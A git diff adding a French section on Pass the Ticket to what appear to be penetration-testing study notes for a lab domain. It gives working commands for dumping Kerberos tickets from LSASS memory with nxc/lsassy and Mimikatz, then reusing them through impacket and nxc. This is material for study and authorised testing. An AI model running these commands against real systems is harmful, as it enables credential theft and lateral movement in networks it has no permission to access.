@@ -178,3 +178,54 @@ klist                  # vérifier
 
 > `forwardable` = le ticket peut être transmis à un autre service (attention en contexte de délégation Kerberos non contrainte).
 
+## Pass the Ticket (PtT)
+
+Voler un TGT ou TGS depuis la mémoire LSASS d'une machine et l'utiliser dans une autre session. Contrairement à PtH et Overpass the Hash, on réutilise un **ticket déjà émis** — utile quand on n'a pas le hash du compte cible.
+
+> Le TGT est réutilisable pour n'importe quel service pendant ~10h. Le TGS est limité au service pour lequel il a été émis.
+
+**Linux (nxc + lsassy)**
+
+```bash
+# 1. Extraire les tickets de LSASS à distance
+nxc smb <IP_CIBLE> -u <user> -H <NTLM_HASH> -M lsassy
+# → tickets sauvegardés dans ~/.nxc/modules/lsassy/
+# Format : TYPE_DOMAINE_USER_SERVICE_CIBLE_ID_IP_TIMESTAMP.ccache
+```
+
+```bash
+# 2. Choisir et charger le ticket
+# Format des fichiers : TYPE_DOMAINE_USER_SERVICE_CIBLE_ID_IP_TIMESTAMP.ccache
+#
+# TGT_CORP.COM_dave_krbtgt_CORP.COM_099be531_192.168.190.76_20260514.ccache
+#  │    │        │    │       │        │         │
+#  │    │        │    │       │        ID unique  IP source
+#  │    │        │    Service (krbtgt = TGT)
+#  │    │        User dont le ticket a été volé
+#  TGT ou TGS    Domaine
+#
+# TGS_CORP.COM_dave_cifs_web04_[...].ccache  → accès SMB à web04
+# TGS_CORP.COM_dave_ldap_dc1_[...].ccache   → accès LDAP au DC
+# TGT_CORP.COM_dave_krbtgt_[...].ccache     → TGT réutilisable pour tout service
+export KRB5CCNAME='/home/kali/.nxc/modules/lsassy/TGS_CORP.COM_dave_cifs_web04_[...].ccache'
+
+# 3. Utiliser le ticket
+impacket-smbclient -k -no-pass corp.com/dave@web04.corp.com -target-ip <IP_WEB04> --kdcHost <IP_DC>
+nxc smb <IP_CIBLE> -u dave -k --use-kcache --kdcHost <IP_DC>
+```
+
+**Windows (Mimikatz)**
+
+```
+# 1. Exporter tous les tickets en .kirbi
+privilege::debug
+sekurlsa::tickets /export
+
+# 2. Injecter le ticket choisi
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+# 3. Vérifier et utiliser
+klist
+ls \\web04\backup
+```
+
